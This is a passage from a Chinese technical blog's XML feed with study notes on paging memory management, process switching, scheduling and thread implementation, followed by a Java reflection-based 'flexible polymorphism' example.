title="逻辑地址和物理地址"></a>逻辑地址和物理地址</h2><ul><li><p>逻辑地址。用户源程序经编译、链接后得到可装入程序。由于无法预先知道程序装入内存的具体位置，因此不可能在程序中直接使用内存地址，只能暂定程序的起始地址为 0。这样，程序中指令和数据的地址都是相对 0 这个起始地址进行计算的，按照这种方法确定的地址称为逻辑地址或相对地址。一般情况下，目标模块（程序）和装入模块（程序）中的地址都是逻辑地址。</p></li><li><p>逻辑地址空间。一个目标模块（程序）或装入模块（程序）的所有逻辑地址的集合，称为逻辑地址空间或相对地址空间。</p></li><li><p>物理地址。内存中实际存储单元的地址称为物理地址，物理地址也称为绝对地址或内存地址。为了使程序装入内存后能够正常运行，就必须将程序代码中的逻辑地址转换为物理地址，这个转换操作称为地址转换。</p></li><li><p>物理地址空间。内存中全部存储单元的物理地址集合称为物理地址空间、绝对地址空间或内存地址空间。由于每个内存单元都有唯一的内存地址编号，因此物理地址空间是一个一维的线性空间。要使装入内存的程序后能够正常运行、互不干扰，就必须将不同程序装入到内存空间的不同区域。</p></li><li><p>虚拟地址空间。CPU 支持的地址范围一般远大于机器实际内存的大小，对于多出来的那部分地址（没有对应的实际内存）程序仍然可能使用，我们将程序能够使用的整个地址范围称为虚拟地址空间。如 Windows XP 采用 32 位地址结构，每个用户进程的虚拟地址空间为 4GB（232），但可能实际内存只有 2GB。虚拟地址空间中的某个地址称为虚拟地址，而用户进程的虚拟地址就是前面所说的逻辑地址。</p></li></ul><h2 id="分页存储管理的基本原理"><a href="#分页存储管理的基本原理" class="headerlink" title="分页存储管理的基本原理"></a>分页存储管理的基本原理</h2><h3 id="1．实现原理"><a href="#1．实现原理" class="headerlink" title="1．实现原理"></a>1．实现原理</h3><p>在分页存储管理中，一个程序的逻辑地址空间被划分成若干个大小相等的区域，每个区域称为页或页面，并且程序地址空间中所有的页从 0 开始顺序编号。相应地，内存物理地址空间也按同样方式划分成与页大小相同的区域，每个区域称为物理块或页框，与页一样内存空间中的所有物理块也从 0 开始顺序编号。在为程序分配内存时，允许以页为单位将程序的各个页，分别装入内存中相邻或不相邻的物理块中。由于程序的最后一页往往不能装满分配给它的物理块，于是会有一定程度的内存空间浪费，这部分被浪费的内存空间称为页内碎片。</p><p>分页系统中页的选择对系统性能有重要影响。若页划分得过小，虽然可以有效减少页内碎片，并提高内存利用率，但会导致每个进程需要更多的页，这样会使分页系统中用于页管理的页表增大，而占用更多的内存空间。若页划分得过大，虽然可以减少页表大小，并提高页的置换速度，但会导致页内碎片增大，而且当一个页大到能装下一个程序时就退化为分区存储管理了。因此页的大小应适中，分页系统中页的大小取决于机器的地址结构，一般设置为 2 的整数幂，通常为 512B～8KB。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200917080339283.png" alt="image-20200917080339283"></p><h3 id="2．逻辑地址结构"><a href="#2．逻辑地址结构" class="headerlink" title="2．逻辑地址结构"></a>2．逻辑地址结构</h3><p>在分页存储管理中，程序中的逻辑地址被转换为页号和页内地址。这个转换工作在程序执行时由系统硬件自动完成，整个过程对用户透明。因此用户编程时不需要知道逻辑地址与页号和页内地址的对应关系，只需要使用一维的逻辑地址。</p><p>程序的一维逻辑地址空间经过系统硬件自动分页后，形成「页号 + 页内地址」的地址结构。在图 所示的地址结构中，逻辑地址通过页号和页内地址来共同表示。其中，0～11 位是页内地址，即每个页的大小是 4KB；12～31 位是页号，即地址空间最多允许有 1M 个页。一维逻辑地址与页号和页内地址的关系是（注：页长即一页的大小）</p><p>一维逻辑地址 = 页号 × 页长 + 页内地址</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200917080459968.png" alt="image-20200917080459968"></p><h3 id="3．数据结构"><a href="#3．数据结构" class="headerlink" title="3．数据结构"></a>3．数据结构</h3><p>为了实现分页存储管理，系统主要设置了以下两种表格。</p><ul><li>（1）页表</li></ul><p>在分页系统中，允许程序所有的页以离散方式分别存储在内存不同的物理块里，为了使程序能够正确运行，必须在内存空间中找到存放每个页的物理块。因此操作系统为每个程序（进程）建立了一张页映射表，简称页表（Page Table），用来存储页号及其映射（装入）的内存物理块号。最简单的页表由页号及其映射的物理块号组成。由于页表的长度由程序所拥有页的个数决定，故每个程序的页表长度通常不同。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200917080632378.png" alt="image-20200917080632378"></p><ul><li>（2）内存分配表</li></ul><p>为了正确地将一个页装入到内存的某一物理块中，就必须知道内存中所有物理块的使用情况，因此系统建立一张内存分配表来记录内存中物理块的分配情况。由于每个物理块的大小相同且不会改变大小，因此最简单的办法是用一张位示图（Bitmap）来构成内存分配表。位示图是指在内存中开辟若干个字，它的每一位与内存中的一个物理块相对应。每一位的值可以是 0 或 1，当取值为 0 时，表示对应的物理块空闲；当取值为 1 时，表示对应的物理块已分配。此外，在位示图中增加一个字节，来记录内存当前空闲物理块的总数。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200917080641623.png" alt="image-20200917080641623"></p><h3 id="4-地址保护"><a href="#4-地址保护" class="headerlink" title="4. 地址保护"></a>4. 地址保护</h3><ol><li>基本地址转换</li></ol><p>在分页存储管理中,系统为每个程序建立了一张页表并存放于内存中 当程序被装入内存但尚未运行时,页表始址(页表在内存中的起始地址)和页表长度(程序逻辑地址空间从页号 0 开始划分出的最大页号)等信息被保存到为该程序(进程)创建的 PCB 中,或保存到请求表中 一旦进程调度程序调度该进程运行时,其 PCB 中保存的页表始址和页表长度信息(或请求表中这两个的信息)便被装入到页表控制寄存器中,基本地址转换过程如图 所示</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200917080749404.png" alt="image-20200917080749404"></p><p>从基本地址转换过程可知  <strong>物理地址 = 物理块号 页长 + 页内地址</strong>,由于页表驻留在内存,因此当 CPU 依据指令中的逻辑地址进行操作时,至少要两次访问内存</p><p>为了提高地址转换的速度,一种行之有效的方法是在地址转换机构中,增加一个具备并行查找能力的高速缓冲寄存器,又称联想存储器(Associative Memory)来构成一张快表,快表中保存着当前运行进程最常用的页号及其映射的物理块号</p><ol start="2"><li>具有快表的地址转换</li></ol><p>在快表中查找和在内存中查找是同时进行的,只不过在内存页表中查找的速度要慢一些,当快表中找到含有该页号的页表项时,则终止内存页表的查找。</p><p>由于成本的关系,快表不可能做得很大,通常只存放 32~1024 个页表项 据统计,从快表中能找到所需页表项的概率可达 90% 以上。</p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200917080941889.png" alt="image-20200917080941889"></p><ol start="3"><li><p>页的保护</p><p>页的保护分为两个方面:一是在逻辑地址转换成物理地址时的保护,通过页号与页表长度的比较防止地址越界;二是在实现信息共享时,对共享信息的保护 通常是在页表中增加一些标志位来设置存取控制字段,一般设置只读 读写 读和执行等权限 如果某进程试图去执行一个只允许读的内存物理块,系统就会发出访问性中断。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统-线程与进程</title>
      <link href="/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%9F%BA%E7%A1%80/"/>
      <url>/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>操作系统原理笔记–&gt;线程与进程.____</p><h2 id="进程切换"><a href="#进程切换" class="headerlink" title="进程切换"></a>进程切换</h2><p>进程切换的实质是回收当前运行进程对 CPU 的控制权,并将 CPU 控制权转交给新调度的就绪进程.</p><h3 id="1．-进程上下文"><a href="#1．-进程上下文" class="headerlink" title="1． 进程上下文"></a>1． 进程上下文</h3><p>除进程实体之外，进程的运行还需要其他硬件环境的支持，如程序状态字 PSW、段表、页表等数据结构。一个进程运行时，CPU 所有寄存器中的内容、进程的状态以及运行栈中的内容被称为进程的上下文。进程上下文是操作系统用来管理和控制进程的内部数据集合，进程在其上下文中运行。进程上下文可分成以下三部分。</p><p>（1）系统级上下文。操作系统内核进程使用的进程上下文信息集合，主要包括 PCB 与逻辑地址到物理地址转换的核心数据结构，如段表、页表及核心栈等。</p><p>（2）寄存器上下文。CPU 中所有寄存器的信息集合，如通用寄存器、指令寄存器、程序状态字寄存器和栈指针等。栈指针可以是指向核心栈的指针，也可以是指向用户栈的指针。</p><p>（3）用户级上下文。用户进程访问和修改的进程上下文信息集合，主要包括进程的程序段、数据段、用户栈和共享存储区。用户级上下文占用进程的虚拟地址空间，交换到外存的分页或分段（内存中的信息暂存于外存，见第 4 章）仍然是进程用户级上下文的组成部分。</p><p>当内核进行进程切换时，它需要保存当前运行进程的进程上下文，以便再次执行该进程时，能够恢复到进程被切换前的运行现场和环境而继续正常运行。发生进程切换时，新、旧进程进行上下文切换。</p><h3 id="2．进程切换的时机"><a href="#2．进程切换的时机" class="headerlink" title="2．进程切换的时机"></a>2．进程切换的时机</h3><p>进程切换是中断驱动的，引起进程切换的中断可分为以下三种。</p><p>（1）中断。中断发生时，操作系统保存当前运行进程（称为旧进程）的现场信息，调度新进程运行。</p><p>（2）异常。当 CPU 在一条指令执行时，检查到有一个或多个预定义的条件或错误产生时就会产生异常，这时，终止当前运行进程的执行，CPU 转去执行异常处理程序。</p><p>（3）系统调用。系统调用是对操作系统服务的一种显式请求。阻塞型系统调用发生时，则当前运行进程被阻塞，此时 CPU 转去执行进程调度程序。</p><p>中断发生时，操作系统暂停当前运行进程的执行，将 CPU 的执行模式切换到内核态，并通过执行进程调度程序选中一个新的就绪进程准备投入运行，这时需完成新、旧进程上下文的切换。</p><h3 id="3．进程上下文切换"><a href="#3．进程上下文切换" class="headerlink" title="3．进程上下文切换"></a>3．进程上下文切换</h3><p>进程切换发生时，当前运行进程让出其占用的 CPU，由操作系统保存当前运行进程（旧进程）的上下文环境，并设置被进程调度程序选中的就绪进程（新进程）的上下文环境，这一过程称为进程的上下文切换。</p><p>进程的上下文环境包括中断处理可能改变的所有信息，以及恢复被中断进程运行时需要的所有信息。进程切换时，操作系统将旧进程的寄存器上下文保存到核心栈的一个上下文层。当中断返回时，由操作系统内核从核心栈中恢复，为旧进程所保存的上下文。进程切换主要包括以下 6 个步骤。</p><p>（1）当前运行进程（旧进程）被中断时，保存其 CPU 现场信息。</p><p>（2）对被中断的当前运行进程进行 PCB 更新，包括改变进程状态和其他相关信息。</p><p>（3）将被中断的当前运行进程的 PCB 移入适当的队列（因时间片到则移入进程就绪队列，因某事件发生则移入相应的进程阻塞队列）。</p><p>（4）由进程调度程序选中一个就绪进程（新进程），为其设置执行的上下文环境并对其 PCB 进行更新。</p><p>（5）修改新进程的地址空间，更新新进程的内存管理信息。</p><p>（6）恢复被选中的新进程最后一次进程上下文切换时所保存的 CPU 现场信息。</p><p>进程上下文切换时，当前运行进程（旧进程）对 CPU 的控制权被回收，其状态转变为就绪态或阻塞态。</p><h2 id="进程调度的方式和时机"><a href="#进程调度的方式和时机" class="headerlink" title="进程调度的方式和时机"></a>进程调度的方式和时机</h2><h3 id="1．进程调度方式"><a href="#1．进程调度方式" class="headerlink" title="1．进程调度方式"></a>1．进程调度方式</h3><p>为了实现不同的 CPU 调度目标，不同系统可以使用不同的进程调度方式。一般来说，进程的调整方式可分为非抢占式（非剥夺式）调度和抢占式（剥夺式）调度两类。</p><p>（1）非抢占式调度。在使用非抢占式调度方式的系统中，进程调度算法选中一个进程后就会让该进程一直运行下去，直到该进程运行结束自动释放 CPU 的使用权。或者在运行过程中因发生某等待事件而阻塞时，才将 CPU 的使用权返还给进程调度程序。非抢占式调度的优点是实现简单、系统开销小。但系统出现了紧急事件时不能立即处理，即实时性差。因此，非抢占式调度方式不适用于实时系统和分时系统。</p><p>（2）抢占式调度。在没有发生等待事件的情况下也允许进程调度程序暂停当前运行进程的执行，并按照某种原则将当前运行进程占用的 CPU 分配给另一个更重要、更紧迫的进程使用。在这种调度方式下，被暂停运行的进程其他所需资源均已满足而只是被剥夺了 CPU 的使用权，故其状态应由运行状态返回到就绪状态，并将其 PCB 插入到进程就绪队列。常用的抢占原则主要有以下两种。</p><p>① 高优先级原则。这种抢占原则允许拥有更高优先级的进程抢占当前运行进程所使用的 CPU。在使用高优先级抢占原则的系统中，如果有更高优先级的就绪进程到达时，则进程调度程序立即暂停当前运行进程的执行（由运行态变为就绪态），然后将 CPU 分配给这个拥有更高优先级的就绪进程使用。</p><p>② 时间片原则。在分时系统中各就绪进程按照时间片轮流执行，当运行进程的时间片到时，则进程调度程序立即暂停当前运行进程的执行（由运行态变为就绪态），然后将 CPU 分配给下一个就绪进程。</p><p>因此抢占式调度方式适合于大多数实时系统以及所有分时系统。抢占式调度能够防止一个进程较长时间占用 CPU，尤其是能够满足实时系统对响应时间的要求，且能获得较好的响应时间。但是，抢占式调度会增加系统中进程切换的频率，与非抢占式调度相比则增加了进程切换的开销。</p><h3 id="2．进程调度的时机"><a href="#2．进程调度的时机" class="headerlink" title="2．进程调度的时机"></a>2．进程调度的时机</h3><p>进程调度程序调度性能的优劣将直接影响 CPU 的利用率，因此什么时候运行进程调度程序是操作系统处理进程调度的关键。进程调度的原则是始终使 CPU 处于忙状态，一旦 CPU 空闲就立即进行调度。引起进程调度程序运行的时机主要有两个：一个是当前运行进程执行结束而终止，或因等待某个事件的完成而无法继续执行，这时就需要启动进程调度程序来选择一个新的就绪进程投入运行；另一个是在抢占式调度系统中，进程就绪队列中出现了优先级更高的进程，或当前运行进程的时间片已经用完，这时需要剥夺当前运行进程的 CPU 使用权，并将其分配给更高优先级的就绪进程或以时间片为单位轮转的下一个就绪进程。引起进程调度的原因主要有以下 4 个。</p><p>（1）创建一个新进程后。创建一个新进程后父进程和子进程都处于就绪状态，这时需要确定是父进程先运行还是子进程先运行，即可以由进程调度程序来选择。</p><p>（2）运行进程终止。运行进程正常结束时需要向系统发出一个「进程结束」的系统调用。这时进程调度程序运行，并从进程就绪队列中选择一个新的就绪进程，然后将 CPU 分配给它。</p><p>（3）运行进程阻塞。当运行进程因发生了某种等待事件（如 I/O 请求）或阻塞在某个信号量（信号量概念见第 3 章）时，进程调度程序则调度另一个就绪进程运行。</p><p>（4）支持抢占式调度的系统中，即使没有新的就绪进程出现，为了让所有就绪进程能够轮流使用 CPU，也会在下面两种情况下引起进程调度。</p><p>① 时间片到。发现当前运行进程时间片到时引起进程调度，将 CPU 分配给下一个就绪进程。</p><p>② 进程的优先级发生变化。在按优先级调度的系统中，当进程优先级发生变化时引起进程调度。</p><p>现代操作系统在以下三种情况下不允许进行进程的调度和切换。</p><p>（1）中断处理过程中。由于中断处理通常不属于某一进程，因此不应作为进程的程序段而被剥夺 CPU。</p><p>（2）进程在操作系统内核的临界区（临界区和临界资源概念见第 3 章）中。用户进程通过陷入进入操作系统内核，为实现对临界区的互斥访问，通常以加锁方式防止其他进程进入该临界区。为了加快对临界资源的释放，在该用户进程访问临界资源期间不允许切换到其他进程去执行。</p><p>（3）在需要完全屏蔽中断的原子操作执行过程中。操作系统中常用的原子操作加锁、开锁、中断现场保护和恢复等，原子操作在执行过程中不允许进行进程切换。</p><h3 id="3．进程调度实现"><a href="#3．进程调度实现" class="headerlink" title="3．进程调度实现"></a>3．进程调度实现</h3><p>出现进程调度后，主要完成的任务是进程切换。</p><p>（1）保存当前运行进程的现场信息。当运行进程因某种原因（如时间片到或等待 I/O）需要放弃 CPU 时，进程调度程序将运行进程的 CPU 现场信息，保存到内存该进程 PCB 中的 CPU 状态保护区。</p><p>（2）选择即将运行的进程。进程调度程序根据某种调度算法从进程就绪队列中挑选一个进程，把它的状态由就绪状态改为运行状态，并准备将 CPU 分配给它。</p><p>（3）为新选中的进程恢复现场。将选中进程在内存 PCB 保存的 CPU 现场信息送入 CPU 的各寄存器，然后将 CPU 的使用权交给选中的进程，使它从上次中断运行的断点处恢复正常运行。</p><h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>线程可以简单地理解为 CPU 调度和执行的最小单元 线程的定义有以下 4 种不同的提法 (1)进程内的一个执行单元 (2)进程内的一个可独立调度的实体 (3)线程是进程中一个相对独立的控制流序列 (4)线程是执行的上下文 在引入线程的操作系统中,进程是资源分配的实体,而线程是进程中能够并发执行的实体,是能够被系统独立调度和分派的基本单位 线程除具有为保证其运行而必不可少的资源外,基本不拥有系统资源 一个进程可以包含若干个线程,同属于一个进程的所有线程共享该进程的全部资源。</p><h3 id="线程的实现原理"><a href="#线程的实现原理" class="headerlink" title="线程的实现原理"></a>线程的实现原理</h3><p>进程在 CPU 上实现并发，而 CPU 由操作系统管理。因此进程的实现只能由操作系统内核来进行。但线程就不同了，因为线程隶属进程，除操作系统可以管理线程外，当然也可以由进程直接管理线程。因此线程存在着内核态与用户态两种实现方法。</p><p>（1）内核态线程实现。操作系统要管理线程，就要保存线程的有关资料，即将线程控制块（TCB）放在操作系统内核空间。这样，操作系统内核就同时存在进程控制块（PCB）和线程控制块（TCB）。操作系统依据 PCB 和 TCB 提供的信息对线程进行各种类似于进程的管理。操作系统管理线程最重要的优点是：编程简单，因为线程的复杂性由操作系统承担，用户在编程时无须管理线程的调度，即无须担心线程什么时候执行，什么时候阻塞；另一个优点是：如果一个线程阻塞，操作系统可以从容地调度另一个线程执行，因为在内核态下操作系统能够监控所有的线程。内核态的缺点是效率低，因为每次线程切换都要陷入到内核由操作系统来进行调度，而从用户态陷入到内核态是要花费 CPU 时间的。此外，操作系统需要维护线程表，这又要占用内核稀缺的内存资源。</p><p>（2）用户态线程实现。用户态如何进行线程调度呢？就是除正常执行任务的线程外，还需要用户自己写一个执行系统，即专门负责线程调度的线程。当运行进程因发生某个等待事件要阻塞自己并进行进程切换时先暂不切换，而是看该进程中是否还有其他线程可以执行。如果有，则将 CPU 控制权交给受阻进程中的执行系统线程，由它来调度受阻进程中另一个可执行的线程占用 CPU 运行。这种做法称为「第二次机会」，即当运行进程要阻塞时，操作系统并不切换到其他进程运行，而是给该进程第二次机会（实际上可以有多次机会）让其继续运行。如果该进程只有一个线程，或该进程的所有线程都已阻塞，这种情况下才切换到其他进程运行。用户态实现的优点是灵活，因为操作系统无须知道线程的存在，所以在任何操作系统都能应用；其次是线程切换快，因为切换仅在用户态进行而无须陷入到内核态（核心态）。用户态实现也有两个缺点：一个缺点是：需要修改操作系统，使其在进程切换时不立即切换到其他进程，而是调用受阻进程中的执行系统线程，但这个缺点因改动范围较小而并不严重；另一个严重的缺点是：操作系统在用户态下，调用受阻进程中的执行系统线程做法违反了软件应遵循的层次架构原则（上层程序调用下层服务），即这种调用是下层功能调用了上层功能（操作系统在下，执行系统线程在上）。</p><p>（3）混合式线程实现。鉴于用户态和内核态的线程实现都存在缺陷，所以现代操作系统将二者结合起来使用，称为混合式线程。用户态的执行系统线程负责进程内部线程在非阻塞时的切换；内核态的操作系统则负责阻塞线程的切换，即同时实现内核态和用户态管理。其中内核态线程较少，而用户态线程较多，每个内核态线程可以服务一个或多个用户态线程。在分配线程时，可将需要执行阻塞操作的线程设为内核态线程，而将不会执行阻塞操作的线程设为用户态线程。这样，就可以兼顾内核态和用户态的优点而避免其缺点。</p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>柔性多态</title>
      <link href="/%E6%9F%94%E6%80%A7%E5%A4%9A%E6%80%81/"/>
      <url>/%E6%9F%94%E6%80%A7%E5%A4%9A%E6%80%81/</url>
      
        <content type="html"><![CDATA[<h1 id="柔性多态"><a href="#柔性多态" class="headerlink" title="柔性多态"></a>柔性多态</h1><p>以求圆和长方形面积为例 假设其类图如图 </p><p><img src="https://gitee.com/MysticalYu/pic/raw/master/hexo/image-20200918104352947.png" alt="image-20200918104352947"></p><p>这是个常规的多态程序设计，在子类中重写父类的getArea即可；</p><p>但是如果随着时间的变迁，还需要求圆和长方形的周长该如何呢？重新定义一个方法getPerimeter</p><div class="note info flat"><p>float getPerimeter()</p></div><p>然后再在子类中实现。这势必造成接口及实现模块 客户端程序都需要修改并重新编译。</p><p>普通多态编程局限性:如果接口函数内容发生变化,那么相应的各实现子类必须发生变化,导致相关联的各级模块必须重新编程及编译,这即是普通多态编程的局限性 造成这一结果的主要原因是父类 子类定义的多态函数关联过强,消除这种关联性是实现柔性多态功能的关键</p><div class="note info flat"><p>修改后的代码如下：</p></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> design;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author:ycc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &lt;T&gt;</span></span><br><span class="line"><span class="comment"> * 描述： 柔性多态， 在父接口中定义转发方法，子类实现转发，具体转发规则由子类决定。实现增加规则时不需要重新编译接口。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Polymorphic</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Polymorphic function definition</span></span><br><span class="line"></span><br><span class="line">    <span class="function">T <span class="title">dispatch</span><span class="params">(<span class="keyword">int</span> nID, T in)</span> <span class="keyword">throws</span> ReflectiveOperationException</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flexible</span>&lt;<span class="title">T</span>&gt; <span class="keyword">implements</span> <span class="title">Polymorphic</span>&lt;<span class="title">T</span>&gt; </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> T in;</span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Nid</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> List&lt;String&gt; methods = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">static</span> String method1 = <span class="string">&quot;method1&quot;</span>;</span><br><span class="line">        <span class="keyword">static</span> String method2 = <span class="string">&quot;method2&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> &#123;</span><br><span class="line">            methods.add(method1);</span><br><span class="line">            methods.add(method2);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> T <span class="title">dispatch</span><span class="params">(<span class="keyword">int</span> nID, T in)</span> <span class="keyword">throws</span> ReflectiveOperationException </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.in = in;</span><br><span class="line">        Method declaredMethod = <span class="keyword">this</span>.getClass().getDeclaredMethod(Nid.methods.get(nID));</span><br><span class="line">        <span class="keyword">return</span> (T) declaredMethod.invoke(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  T <span class="title">method1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//handler</span></span><br><span class="line">        <span class="keyword">return</span> in;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  T <span class="title">method2</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//handler</span></span><br><span class="line">        <span class="keyword">return</span> in;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Polymorphic polymorphicNonT  = <span class="keyword">new</span> Flexible();</span><br><span class="line">        Float dispatch = (Float) polymorphicNonT.dispatch(<span class="number">1</span>, <span class="number">1.0f</span>);</span><br><span class="line">        System.out.println(dispatch);</span><br><span class="line">        Polymorphic&lt;FlexibleBean&gt; polymorphicHasT  = <span class="keyword">new</span> Flexible&lt;&gt;();</span><br><span class="line">        FlexibleBean dispatch1 = polymorphicHasT.dispatch(<span class="number">0</span>, <span class="keyword">new</span> FlexibleBean());</span><br><span class="line">        System.out.println(dispatch1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FlexibleBean</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;FlexibleBean&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面改写中，接口中的内容不变，而子类重写dispatch仅起到转发的作用，具体转发的函数是非多态函数。如果再需要一个方法就可以在子类中定义个方法，而接口无需再次编译。</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>为什么部署SSL证书后还是提示不安全</title>
      <link href="/%E4%B8%BA%E4%BB%80%E4%B9%88%E9%83%A8%E7%BD%B2SSL%E8%AF%81%E4%B9%A6%E5%90%8E%EF%BC%8C%E8%BF%98%E6%98%AF%E6%8F%90%E7%A4%BA%E4%B8%8D%E5%AE%89%E5%85%A8/"/>
      <url>/%E4%B8%BA%E4%BB%80%E4%B9%88%E9%83%A8%E7%BD%B2SSL%E8%AF%81%E4%B9%A6%E5%90%8E%EF%BC%8C%E8%BF%98%E6%98%AF%E6%8F%90%E7%A4%BA%E4%B8%8D%E5%AE%89%E5%85%A8/</url>
      
